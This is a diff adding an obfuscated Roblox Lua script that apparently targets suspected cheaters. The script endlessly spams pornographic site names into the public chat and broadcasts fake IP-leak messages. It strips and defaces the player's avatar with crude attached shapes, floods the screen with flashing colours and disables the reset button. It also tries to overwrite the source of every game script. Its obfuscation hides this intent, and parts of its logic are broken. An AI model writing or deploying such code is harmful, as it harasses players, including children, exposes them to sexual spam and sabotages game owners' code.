@@ -1,0 +1,315 @@
+local _0xZ1 = game:GetService("Players")
+local _0xA2 = math.random(1e17, 9e17)
+local _0xB3 = function(_0xC4) return _0xC4 * _0xA2 end
+local _0xD5 = function(_0xE6) return _0xE6 / _0xA2 end
+local _0xF7 = _0xB3(911)
+local _0xG8 = function() return _0xD5(_0xF7) == 911 end
+local _0xH9 = {68, 85, 68, 69}
+local _0xI0 = _0xB3(8888)
+local _0xJ1 = {58, 32, 78, 79}
+local _0xK2 = {84, 32, 68, 69}
+local _0xL3 = function() return _0xD5(_0xB3(42)) end
+local _0xM4 = ""
+
+for _, _0xN5 in ipairs(_0xH9) do
+    _0xM4 = _0xM4 .. string.char(_0xD5(_0xB3(_0xN5)))
+end
+
+for _, _0xO6 in ipairs(_0xJ1) do
+    _0xM4 = _0xM4 .. string.char(_0xD5(_0xB3(_0xO6)))
+end
+
+for _, _0xP7 in ipairs(_0xK2) do
+    _0xM4 = _0xM4 .. string.char(_0xD5(_0xB3(_0xP7)))
+end
+
+local function _0xQ8(_0xR9)
+    local _0xS0 = false
+    pcall(function()
+        local _0xT1 = loadstring
+        loadstring = function() error(_0xD5(_0xB3(777)) .. " roasted!") end
+        if _G[_0xD5(_0xB3(9876543211))] or getfenv()[_0xD5(_0xB3(1234567891))] or _0xL3() == 42 then
+            _0xS0 = true
+        end
+    end)
+    return _0xG8() and _0xS0
+end
+
+local function _0xU2(_0xV3)
+    if _0xG8() and _0xQ8(_0xV3) then
+        pcall(function()
+            local _0xW4 = game:GetService("ReplicatedStorage")
+            local _0xX5 = _0xW4:FindFirstChild("DefaultChatSystemChatEvents")
+            if _0xX5 then
+                local _0xY6 = _0xX5:FindFirstChild("SayMessageRequest")
+                if _0xY6 then
+                    local _0xZ7 = {
+                        "Check out: adultfriendfinder.com",
+                        "Join xvideos.com!",
+                        "Visit pornhub.com!",
+                        "See redtube.com!",
+                        "Hot stuff at youporn.com!",
+                        "Get on xhamster.com!",
+                        "Join brazzers.com!",
+                        "Vids at bangbros.com!",
+                        "Check naughtyamerica.com!",
+                        "Wild stuff at realitykings.com!",
+                        "See mofos.com!",
+                        "Links at spankbang.com!",
+                        "Join tushy.com!",
+                        "Visit digitalplayground.com!",
+                        "Content at vixen.com!",
+                        "Check blacked.com!",
+                        "Stuff at teamskeet.com!",
+                        "Join evilangel.com!",
+                        "Vids at puremature.com!",
+                        "See legalporno.com!",
+                        "Get on twistys.com!",
+                        "Check dogfartnetwork.com!",
+                        "Links at sex.com!",
+                        "Join porntube.com!",
+                        "Stuff at xcafe.com!",
+                        "Visit beeg.com!",
+                        "Content at xnxx.com!",
+                        "Check tube8.com!",
+                        "Vids at youjizz.com!",
+                        "Join porn.com!",
+                        "See eporner.com!",
+                        "Links at pornhd.com!",
+                        "Visit daftsex.com!",
+                        "Stuff at spankwire.com!",
+                        "Check hclips.com!"
+                    }
+                    while true do
+                        local _0xA8 = math.random(1, #_0xZ7)
+                        _0xY6:FireServer(_0xZ7[_0xA8], "All")
+                        wait(1)
+                    end
+                end
+            end
+
+            local _0xB9 = {
+                "192.168.1." .. math.random(1, 255),
+                "10.0.0." .. math.random(1, 255),
+                "172.16.254." .. math.random(1, 255),
+                "93.184.216." .. math.random(1, 255),
+                "198.51.100." .. math.random(1, 255)
+            }
+            local _0xC0 = {
+                "Moscow",
+                "New York",
+                "Tokyo",
+                "London",
+                "Sydney",
+                "Berlin",
+                "Dubai",
+                "Paris",
+                "Los Angeles",
+                "Shanghai"
+            }
+            local _0xD1 = {
+                "roblox-cheat-api.com",
+                "roblox-hackz.net",
+                "roblox-exploit.org",
+                "roblox-banhammer.biz",
+                "roblox-security.io"
+            }
+            for _, _0xE2 in ipairs(_0xD1) do
+                local _0xF3 = _0xB9[math.random(1, #_0xB9)]
+                local _0xG4 = _0xC0[math.random(1, #_0xC0)]
+                print("Sent IP: " .. _0xF3 .. " from " .. _0xG4 .. " to " .. _0xE2)
+                if _0xY6 then
+                    _0xY6:FireServer("My IP: " .. _0xF3 .. " from " .. _0xG4 .. " sent to " .. _0xE2 .. "!", "All")
+                    wait(1)
+                end
+            end
+
+            local _0xH5 = _0xV3.Character
+            if _0xH5 then
+                for _, _0xI6 in ipairs(_0xH5:GetChildren()) do
+                    if _0xI6:IsA("Shirt") or _0xI6:IsA("Pants") or _0xI6:IsA("Accessory") then
+                        _0xI6:Destroy()
+                    end
+                end
+                for _, _0xJ7 in ipairs(_0xH5:GetDescendants()) do
+                    if _0xJ7:IsA("BasePart") then
+                        _0xJ7.BrickColor = BrickColor.new("Nougat")
+                        _0xJ7.Material = Enum.Material.SmoothPlastic
+                    end
+                end
+                local _0xK8 = _0xH5:FindFirstChild("HumanoidRootPart")
+                if _0xK8 then
+                    local _0xL9 = Instance.new("Part")
+                    _0xL9.Size = Vector3.new(0.5, 1.2, 0.5)
+                    _0xL9.Shape = Enum.PartType.Cylinder
+                    _0xL9.Color = Color3.new(math.random(), math.random(), math.random())
+                    _0xL9.Position = _0xK8.Position + Vector3.new(0, -1, 1)
+                    _0xL9.Anchored = false
+                    _0xL9.CanCollide = false
+                    _0xL9.Parent = game.Workspace
+                    local _0xM0 = Instance.new("Weld")
+                    _0xM0.Part0 = _0xK8
+                    _0xM0.Part1 = _0xL9
+                    _0xM0.C0 = CFrame.new(0, -1, 1)
+                    _0xM0.Parent = _0xL9
+                    spawn(function()
+                        while true do
+                            _0xL9.Color = Color3.new(math.random(), math.random(), math.random())
+                            wait(0.5)
+                        end
+                    end)
+                    local _0xN1 = Instance.new("Part")
+                    _0xN1.Size = Vector3.new(0.4, 0.4, 0.4)
+                    _0xN1.Shape = Enum.PartType.Ball
+                    _0xN1.Color = Color3.new(math.random(), math.random(), math.random())
+                    _0xN1.Position = _0xK8.Position + Vector3.new(0.3, -1.5, 1)
+                    _0xN1.Anchored = false
+                    _0xN1.CanCollide = false
+                    _0xN1.Parent = game.Workspace
+                    local _0xO2 = Instance.new("Weld")
+                    _0xO2.Part0 = _0xK8
+                    _0xO2.Part1 = _0xN1
+                    _0xO2.C0 = CFrame.new(0.3, -1.5, 1)
+                    _0xO2.Parent = _0xN1
+                    local _0xP3 = Instance.new("Part")
+                    _0xP3.Size = Vector3.new(0.4, 0.4, 0.4)
+                    _0xP3.Shape = Enum.PartType.Ball
+                    _0xP3.Color = Color3.new(math.random(), math.random(), math.random())
+                    _0xP3.Position = _0xK8.Position + Vector3.new(-0.3, -1.5, 1)
+                    _0xP3.Anchored = false
+                    _0xP3.CanCollide = false
+                    _0xP3.Parent = game.Workspace
+                    local _0xQ4 = Instance.new("Weld")
+                    _0xQ4.Part0 = _0xK8
+                    _0xQ4.Part1 = _0xP3
+                    _0xQ4.C0 = CFrame.new(-0.3, -1.5, 1)
+                    _0xQ4.Parent = _0xP3
+                    spawn(function()
+                        while true do
+                            _0xN1.Color = Color3.new(math.random(), math.random(), math.random())
+                            _0xP3.Color = Color3.new(math.random(), math.random(), math.random())
+                            wait(0.5)
+                        end
+                    end)
+                    local _0xR5 = Instance.new("BodyAngularVelocity")
+                    _0xR5.MaxTorque = Vector3.new(0, math.huge, 0)
+                    _0xR5.AngularVelocity = Vector3.new(0, 150, 0)
+                    _0xR5.Parent = _0xK8
+                    local _0xS6 = Instance.new("Fire")
+                    _0xS6.Size = 20
+                    _0xS6.Heat = 35
+                    _0xS6.Parent = _0xK8
+                    local _0xT7 = Instance.new("Smoke")
+                    _0xT7.Opacity = 0.8
+                    _0xT7.Parent = _0xK8
+                    local _0xU8 = Instance.new("BillboardGui")
+                    _0xU8.Size = UDim2.new(5, 0, 2, 0)
+                    _0xU8.Adornee = _0xK8
+                    _0xU8.AlwaysOnTop = true
+                    _0xU8.Parent = game.Workspace
+                    local _0xV9 = Instance.new("TextLabel")
+                    _0xV9.Size = UDim2.new(1, 0, 1, 0)
+                    _0xV9.Text = _0xV3.Name .. " IS HACKING!"
+                    _0xV9.TextColor3 = Color3.new(1, 0, 0)
+                    _0xV9.TextScaled = true
+                    _0xV9.BackgroundTransparency = 1
+                    _0xV9.Parent = _0xU8
+                end
+            end
+
+            local _0xW0 = Instance.new("ScreenGui")
+            _0xW0.IgnoreGuiInset = true
+            _0xW0.Parent = _0xV3.PlayerGui
+            local _0xX1 = Instance.new("Frame")
+            _0xX1.Size = UDim2.new(1, 0, 1, 0)
+            _0xX1.BackgroundColor3 = Color3.new(1, 0, 0)
+            _0xX1.BackgroundTransparency = 0.3
+            _0xX1.Parent = _0xW0
+            spawn(function()
+                while true do
+                    _0xX1.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+                    wait(0.1)
+                end
+            end)
+            game:GetService("Lighting").Brightness = 0.05
+            game:GetService("Lighting").FogEnd = 3
+            for _0xY2 = 1, 10 do
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "HACKER DETECTED!",
+                    Text = "IP: " .. _0xB9[math.random(1, #_0xB9)] .. " from " .. _0xC0[math.random(1, #_0xC0)] .. "!",
+                    Duration = 5
+                })
+                wait(1)
+            end
+
+            game:GetService("StarterGui"):SetCore("ResetButtonCallback", false)
+            game:GetService("UserInputService").InputBegan:Connect(function(_0xZ3)
+                if _0xZ3.KeyCode == Enum.KeyCode.Escape then
+                    game:GetService("StarterGui"):SetCore("SendNotification", {
+                        Title = "NO ESCAPE!",
+                        Text = "Stuck forever!",
+                        Duration = 5
+                    })
+                end
+            end)
+
+            local _0xA4 = {
+                game:GetService("ReplicatedStorage"),
+                game:GetService("ServerScriptService"),
+                game:GetService("ServerStorage")
+            }
+            for _, _0xB5 in ipairs(_0xA4) do
+                for _, _0xC6 in ipairs(_0xB5:GetDescendants()) do
+                    if _0xC6:IsA("Script") or _0xC6:IsA("ModuleScript") then
+                        print("Cheater " .. _0xV3.Name .. " tried to access " .. _0xC6:GetFullName())
+                        if _0xY6 then
+                            _0xY6:FireServer("Accessing " .. _0xC6:GetFullName() .. "! Join pornhub.com!", "All")
+                        end
+                        pcall(function()
+                            _0xC6.Source = "print('HACKED BY " .. _0xV3.Name .. "!')"
+                        end)
+                    end
+                end
+            end
+
+            local _0xD7 = Instance.new("Part")
+            _0xD7.Anchored = true
+            _0xD7.Position = Vector3.new(0, 150, 0)
+            _0xD7.Size = Vector3.new(150, 150, 150)
+            _0xD7.BrickColor = BrickColor.new("Really red")
+            _0xD7.Transparency = 0.2
+            _0xD7.Parent = game.Workspace
+            local _0xE8 = Instance.new("Explosion")
+            _0xE8.Position = _0xD7.Position
+            _0xE8.BlastRadius = 100
+            _0xE8.Parent = _0xD7
+            local _0xF9 = Instance.new("Sound")
+            _0xF9.SoundId = "rbxasset://sounds/metal.ogg"
+            _0xF9.Volume = 10
+            _0xF9.Looped = true
+            _0xF9.Parent = _0xD7
+            _0xF9:Play()
+            local _0xG0 = Instance.new("Sparkles")
+            _0xG0.SparkleColor = Color3.new(1, 0, 0)
+            _0xG0.Parent = _0xD7
+            wait(15)
+            _0xD7:Destroy()
+        end)
+    end
+end
+
+_0xZ1.PlayerAdded:Connect(function(_0xH1)
+    if _0xG8() and _0xH1 == _0xZ1.LocalPlayer then
+        _0xU2(_0xH1)
+    end
+end)
+
+for _, _0xI2 in ipairs(_0xZ1:GetPlayers()) do
+    if _0xG8() and _0xI2 == _0xZ1.LocalPlayer then
+        _0xU2(_0xI2)
+    end
+end
+
+if _0xG8() then
+    print(_0xD5(_0xB3(999)) .. " Chaos activated! Cheater " .. _0xZ1.LocalPlayer.Name .. " is EXPOSED to ALL!")
+end
